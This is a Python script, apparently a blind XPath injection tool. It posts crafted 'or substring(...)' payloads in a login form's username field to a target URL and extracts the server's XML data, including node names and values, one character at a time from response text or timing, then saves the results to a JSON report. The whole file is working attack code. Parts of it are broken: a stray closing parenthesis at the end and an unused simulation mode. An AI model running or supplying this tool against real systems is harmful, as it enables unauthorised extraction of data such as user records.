import requests
import time
import string
import logging
import json
import argparse
import asyncio
import aiohttp

# Configure logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Function to test the XPath injection payload
def test_xpath_payload(payload, url, timeout=5):
    try:
        data = {'username': payload}
        start_time = time.time()
        response = requests.post(url, data=data, timeout=timeout)
        end_time = time.time()
        response_time = end_time - start_time
        logging.debug(f"Payload: {payload} | Response: {response.text[:100]} | Time: {response_time}s")
        return response.text, response_time
    except requests.Timeout:
        logging.warning(f"Request timed out for payload: {payload}")
        return "", 0
    except requests.RequestException as e:
        logging.error(f"Request failed: {e}")
        return "", 0

# Function to determine the length of a node's name
def find_node_length(xpath_expression, url, max_length=50):
    length = 1
    while length <= max_length:
        payload = f"invalid' or string-length({xpath_expression})={length} and '1'='1"
        response_text, response_time = test_xpath_payload(payload, url)
        if "Success" in response_text or response_time > response_time_threshold:
            return length
        length += 1
    return -1  # Return -1 if the length exceeds max_length without success

# Function to extract a node's name or value
def extract_node_name_or_value(xpath_expression, length, url):
    node_name_or_value = ''
    common_chars = string.ascii_lowercase + string.digits  # Optimize with more common characters first
    for position in range(1, length + 1):
        for char in common_chars:
            payload = f"invalid' or substring({xpath_expression},{position},1)='{char}' and '1'='1"
            response_text, response_time = test_xpath_payload(payload, url)
            if "Success" in response_text or response_time > response_time_threshold:
                node_name_or_value += char
                break
    return node_name_or_value

# Function to count child nodes of a given node
def count_child_nodes(parent_node, url):
    count = 1
    while True:
        payload = f"invalid' or count({parent_node}/*)={count} and '1'='1"
        response_text, response_time = test_xpath_payload(payload, url)
        if "Success" in response_text or response_time > response_time_threshold:
            count += 1
        else:
            return count - 1

# Function to extract child node names
def extract_child_node_names(parent_node, child_count, url):
    child_node_names = []
    for i in range(1, child_count + 1):
        xpath_expression = f"{parent_node}[{i}]"
        length = find_node_length(f"name({xpath_expression})", url)
        child_node_name = extract_node_name_or_value(f"name({xpath_expression})", length, url)
        child_node_names.append(child_node_name)
    return child_node_names

# Function to extract node values
def extract_node_values(parent_node, child_count, url):
    node_values = []
    for i in range(1, child_count + 1):
        xpath_expression = f"{parent_node}[{i}]"
        length = find_node_length(xpath_expression, url)
        node_value = extract_node_name_or_value(xpath_expression, length, url)
        node_values.append(node_value)
    return node_values

# Function to generate a report
def generate_report(data, filename='report.json'):
    with open(filename, 'w') as f:
        json.dump(data, f, indent=4)

# Function to parse command-line arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="Test XPath injection vulnerabilities.")
    parser.add_argument('--url', type=str, required=True, help="The target URL for testing.")
    parser.add_argument('--timeout', type=int, default=5, help="Timeout for HTTP requests.")
    parser.add_argument('--threshold', type=float, default=1.0, help="Response time threshold for detection.")
    parser.add_argument('--simulate', action='store_true', help="Run in simulation mode without making actual requests.")
    return parser.parse_args()

# Main function to find and print the root node's name and child nodes
async def main(url, timeout, response_time_threshold, simulate):
    if simulate:
        print(f"Simulating with URL: {url}")
        # Output the payloads being tested without actually sending the request
        return

    # Find and extract root node name
    root_node_length = find_node_length("name(/*[1])", url)
    print(f"Length of the root node's name: {root_node_length}")
    root_node_name = extract_node_name_or_value("name(/*[1])", root_node_length, url)
    print(f"Root node's name: {root_node_name}")

    # Explore child nodes
    parent_node = f"/{root_node_name}"
    child_count = count_child_nodes(parent_node, url)
    print(f"Number of child nodes: {child_count}")

    if child_count > 0:
        child_node_names = extract_child_node_names(parent_node, child_count, url)
        print("Child node names:")
        for name in child_node_names:
            print(f"  - {name}")

        # Extract values of child nodes
        child_node_values = extract_node_values(parent_node, child_count, url)
        print("Child node values:")
        for value in child_node_values:
            print(f"  - {value}")

        # Generate a report
        report_data = {
            'root_node_name': root_node_name,
            'child_node_names': child_node_names,
            'child_node_values': child_node_values
        }
        generate_report(report_data)

if __name__ == "__main__":
    args = parse_arguments()
    response_time_threshold = args.threshold
    asyncio.run(main(args.url, args.timeout, response_time_threshold, args.simulate))
)
